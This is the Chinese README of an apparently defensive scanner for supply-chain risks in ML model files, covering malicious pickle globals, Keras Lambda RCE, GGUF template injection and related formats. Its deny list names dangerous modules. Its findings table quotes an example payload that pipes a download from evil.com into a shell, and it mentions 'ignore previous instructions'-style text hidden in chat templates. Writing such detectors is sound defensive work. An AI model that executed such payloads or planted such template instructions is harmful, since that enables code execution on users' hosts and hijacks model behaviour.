# @guardbee/mcp-model-scanner

[🇬🇧 English](README.md) | [🇹🇷 Türkçe](TR.md) | **🇨🇳 中文** | [🇯🇵 日本語](JA.md) | [🇰🇷 한국어](KO.md) | [🇧🇷 Português](PT-BR.md) | [🇪🇸 Español](ES.md) | [🇩🇪 Deutsch](DE.md)

一个 MCP（Model Context Protocol）服务器，用于扫描 ML 模型文件的**供应链**风险——扫的是文件本身，而不是加载它的代码。

大多数“AI 安全”工具看的是你的集成代码或流经其中的提示。本包看的是你（或同事，或 `pip install`）从 Hugging Face、注册表或 S3 桶下载的产物：`.pt`/`.pth`/`.pkl` checkpoint 是 **pickle** 文件，反序列化不只是数据反序列化——文件加载瞬间就可以调用任意 Python 代码（`torch.load()`、`pickle.load()` 等）。恶意 checkpoint 是真实、有充分文档记载的攻击向量，而非假想。

> 遥测默认**关闭**。设置 `GUARDBEE_TELEMETRY=1` 后会发送服务器、工具、成功与否、耗时以及文件路径等简短参数值；更长的字符串和 `content`、`token`、`password` 等字段会被占位符替换。参见 [`@guardbee/mcp-telemetry`](../telemetry/ZH.md)。

```
Claude ──► model-scanner ──► Your model files
              │
              ├─ .pt / .pth / .ckpt   → PyTorch zip 容器：提取 data.pkl，遍历 pickle
              ├─ .pkl / .pickle / .bin / .dill → 原始 pickle 流（含 dill gadget）
              ├─ .joblib / .jbl       → pickle + joblib 内嵌的数组字节与嵌套 pickle
              ├─ .npy / .npz          → object 数组（pickle 数据）、伪装成 NumPy 的 pickle
              ├─ .safetensors         → 头结构 + 伪装二进制检查
              ├─ .h5 / .hdf5 / .keras → Keras Lambda 层 RCE（HDF5 与 Keras 3 zip）
              ├─ .onnx                → external_data 路径遍历启发式
              ├─ .gguf                → 头/张量边界、chat template SSTI 与注入文本
              ├─ saved_model.pb / .pb / .pbtxt / .tflite → 访问文件或 Python 的图算子
              └─ hf://owner/repo@rev  → Hugging Face 仓库在某一提交下的全部模型文件
```

---

## 为什么 pickle 是核心

Pickle 流是一个小型栈式 VM 的字节码。`GLOBAL`/`STACK_GLOBAL` 操作码可以命名任何可导入的 Python 对象；紧接着的操作码通常会调用它。没有任何机制阻止精心构造的 pickle 去命名 `os.system` 或 `subprocess.Popen`，而不是张量重建函数——而 `pickle.load()`/`torch.load()` 会欣然解析并调用它。这就是 `picklescan`/`fickling`/Hugging Face 的 Picklescan 集成所围绕的同一技术。

本包实现了从零编写的 pickle 机（协议 0–5），而不是 shell 出到 Python 或使用正则。它逐字节遍历操作码流，在不调用任何东西的前提下跟踪栈和 memo，因此协议 4+ 的 `STACK_GLOBAL` 会解析为栈上真实的模块与名称，包括像 NumPy 2 pickle 那样从 memo 取回的字符串。对原始字节做正则既会漏报也会不断误报。

joblib 也需要这台机器：`joblib.dump` 会在每个数组的 `NumpyArrayWrapper` 之后直接写入数组原始字节（object 数组则是一个完整的嵌套 pickle）。扫描器从栈上读取 wrapper 的 shape 与 dtype，精确跳过相应字节，并同样检查嵌套 pickle。

发现的每个 `GLOBAL`/`STACK_GLOBAL`/`INST` 引用都会对照：
- **拒绝列表**：在张量反序列化路径中没有正当理由出现的模块（`os`、`subprocess`、`socket`、`builtins.eval`、`ctypes`、…）→ 报告为 **critical/high**
- **允许列表**：真实 ML 框架实际会引用的模块（`numpy`、`torch`、`sklearn`、`collections`、…）→ 静默安全，无噪声
- 其他 → 报告为 **medium**（“未知”，而非“恶意”——供人工复核，保持低误报率）

对于 PyTorch 默认的基于 zip 的 checkpoint 格式，扫描器直接从磁盘读取 ZIP 中央目录（支持 Zip64），定位并仅提取较小的 `data.pkl` 元数据条目——从不把数 GB 的 checkpoint 完整加载进内存。

---

## 功能

- **真正的 pickle 解析** — 跟踪栈的 pickle 机，不是正则，也不是 Python 子进程调用
- **44 条危险 global 规则**，覆盖 6 个风险类别（code-execution、process-execution、network、filesystem、reflection、deserialization），含 dill 的 code 对象与 import gadget
- **PyTorch zip 容器支持**（含 Zip64）— 提取并扫描 `data.pkl`，无需加载完整 checkpoint
- **joblib** — 跳过内嵌数组，检查文件中每个 pickle 操作码，含 object 数组的嵌套 pickle；自动解压 zlib/gzip
- **NumPy `.npy`/`.npz`** — object 数组（以 pickle 存储，需 `allow_pickle=True` 加载）以及改用 NumPy 扩展名的普通 pickle
- **`.safetensors` 结构校验** — 畸形/越界头，以及用 `.safetensors` 扩展名伪装的 pickle/zip 检测
- **Keras Lambda 层 RCE** — 覆盖 `.h5`、Keras 3 `.keras` zip 与 SavedModel `keras_metadata.pb`
- **ONNX `external_data` 路径遍历启发式**
- **GGUF** — 头部计数、字符串与数组长度、张量维度、类型和数据边界均与文件本身比对；chat template 检查 Jinja 沙箱逃逸、隐藏字符和面向模型的指令
- **TensorFlow** — SavedModel、冻结 GraphDef（`.pb`/`.pbtxt`）与 TFLite Flex 算子中读写文件、调用 Python 或向调试 URL 发送张量的算子
- **Hugging Face 仓库** — `scan_hf_repo` / `scan hf://owner/repo@revision` 将 revision 解析为提交并从该提交扫描全部模型文件
- 处处有界读取（10MB pickle 前缀、100MB safetensors 头上限、50MB zip 条目上限，GGUF 与 joblib 通过 4MB 窗口读取）— 抵御解压炸弹，不会在巨大模型文件上 OOM
- SARIF 2.1.0 输出 — CI/CD 集成（GitHub Code Scanning 等）
- 通过 `guardbee.yml` 支持配置文件
- 82 个单元测试，每种格式都有恶意与良性 fixture，并在[热门公开模型上做了误报检查](README.md#checked-against-public-models)

---

## 快速开始

### Claude Desktop / MCP 客户端

```json
{
  "mcpServers": {
    "guardbee-model-scanner": {
      "command": "npx",
      "args": ["-y", "@guardbee/mcp-model-scanner"]
    }
  }
}
```

### CLI（CI/CD）

```bash
npx @guardbee/mcp-model-scanner scan ./models --fail-on=high --format=sarif > results.sarif

# 固定提交下的 Hugging Face 模型仓库（branch、tag 或 sha；受限/私有仓库需 HF_TOKEN）
npx @guardbee/mcp-model-scanner scan hf://openai-community/gpt2@607a30d783dfa663caf39e06633721c8d4cfcd7e
```

仓库模式会把 revision 解析为提交 sha，所有文件都从该提交读取，结果对应固定快照；发现指向 `hf://owner/repo@sha/path`。256 MB 以内的文件完整下载；更大的文件读取前 64 MB，zip 容器另读末尾 64 MB（中央目录），检查所需的头、pickle 流与张量表都在其中。

---

## MCP 工具

| 工具 | 说明 |
|------|----------|
| `scan_file` | 扫描单个模型文件 |
| `scan_directory` | 递归扫描模型文件目录（SavedModel 通过 `saved_model.pb`） |
| `scan_hf_repo` | 在固定提交下扫描 Hugging Face 模型仓库的全部模型文件 |
| `list_patterns` | 按风险类别列出危险 global 目录及所检查的 TensorFlow 算子 |

---

## 捕获内容

| 格式 | 检查 | 严重级别 | 示例 |
|---|---|---|---|
| pickle / PyTorch | 引用 `os`、`posix`、`nt`、`subprocess`、`socket`、`ctypes`、`runpy`、`pty.spawn`、`platform.popen`、`commands` | critical | `os.system('curl evil.com/x \| sh')` |
| pickle / PyTorch | `builtins.eval`/`exec`/`compile`/`__import__`、`pickle.loads`、`marshal.loads` | critical | 递归/嵌套载荷，或直接 eval |
| pickle / PyTorch | `builtins.getattr`/`open`、`shutil.*`、`importlib.*`、`requests.*`、`webbrowser.open`、`urllib*.urlopen` | high | 外泄、SSRF、文件读写 |
| safetensors | 头以 pickle/zip 签名开头而非长度 | critical | `.pkl` 重命名为 `.safetensors` |
| safetensors | 张量 `data_offsets` 超出实际数据区 | high | 解析器越界读取 |
| safetensors | 无效/过大的头长度、非 JSON 头 | high | 损坏或对抗性构造的头 |
| Keras .h5/.keras/SavedModel | 模型配置中 `class_name: "Lambda"` | critical | 加载时序列化函数 RCE |
| ONNX | `external_data` 位置包含 `..` | high | 路径遍历到任意文件 |
| dill | `dill._dill._create_code`/`_create_function`/`_eval_repr` | critical | 由字节码重建并在加载时调用的函数 |
| dill | `dill._dill._import_module`/`_get_attr`/`_create_filehandle` | high | 不出现 `os` 即可调用 `os.system` |
| joblib | 主流或 object 数组嵌套 pickle 中命中任一 pickle 规则 | 随规则 | 藏在真实数组之后的 payload |
| NumPy | object dtype；`.npy` 扩展名的 pickle | medium / high | `np.load(..., allow_pickle=True)` 会反序列化 |
| GGUF | chat template 访问 Python 内部（`__class__`、`__globals__`、…） | critical | Jinja 沙箱逃逸（CVE-2024-34359） |
| GGUF | 元数据中的隐藏 Unicode 或“忽略之前的指令”类文本 | high | 注入每次对话的指令 |
| GGUF | 与文件不一致的计数、长度、维度或张量边界 | high | 未修补加载器的堆溢出 |
| TensorFlow | `WriteFile` / `ReadFile` / `PyFunc` / 文件数据集 / 写往 `file://` 的 `PrintV2` | critical–medium | 触及服务主机的计算图 |

完整危险 global 目录：运行 `list_patterns` 工具，或见 [`src/dangerousGlobals.ts`](src/dangerousGlobals.ts)。

0.4 新增的规则 ID 和做过误报检查的公开模型列表见 [README.md](README.md#rule-ids-added-in-04)。SARIF 输出结构不变。

这些是为低误报率调优的**启发式**发现——尤其 HDF5 与 ONNX 是复杂的二进制/protobuf 格式，通过有界文本模式搜索而非完整结构解析。每条发现仍应复核；干净扫描不是正式安全证明。

---

## 配置（`guardbee.yml`）

```yaml
model-scanner:
  fail-on: high       # any | critical | high | medium | low | none
  max-files: 2000
  exclude:
    - "fixtures/"
```

---

## 限制（设计如此）

- 仅扫描原始（非 zip）pickle 流的前 10MB（joblib 文件会遍历到末尾）——危险 global 必须在其实例之前被引用，因此该边界是相对把巨大遗留 checkpoint 完整加载进内存的合理权衡。
- ZIP 提取仅支持 STORED 与 DEFLATE（覆盖默认 PyTorch checkpoint 格式）。
- HDF5/ONNX 检查是基于有界前缀的模式匹配，而非完整结构/protobuf 解析。
- 以 bz2、xz、lzma 或 lz4 压缩的 joblib 文件只报告不解压；GGUF v1 与大端 GGUF 只报告不解析。
- TFLite 检查查找 Flex delegate 算子名；内置 TFLite 算子只做张量运算。
- GGUF 指令检查匹配常见注入措辞与隐藏字符，措辞谨慎的指令仍可能通过。请阅读非自建模型的 chat template。
- 扫描的是**文件**，而非运行时行为——不会执行或沙箱任何东西。

---

## 开发

```bash
npm run build
npm test             # 82 unit tests
```

---

## 许可证

MIT — [GuardBee](https://guardbee.ai)

## 反馈

有问题、想法或误报？请在 [GitHub Discussions](https://github.com/GuardBee/guardbee-mcp/discussions) 发帖或[提交 issue](https://github.com/GuardBee/guardbee-mcp/issues)。如果 GuardBee 对你有帮助，给[仓库](https://github.com/GuardBee/guardbee-mcp)点个 ⭐ 能让更多人发现它。
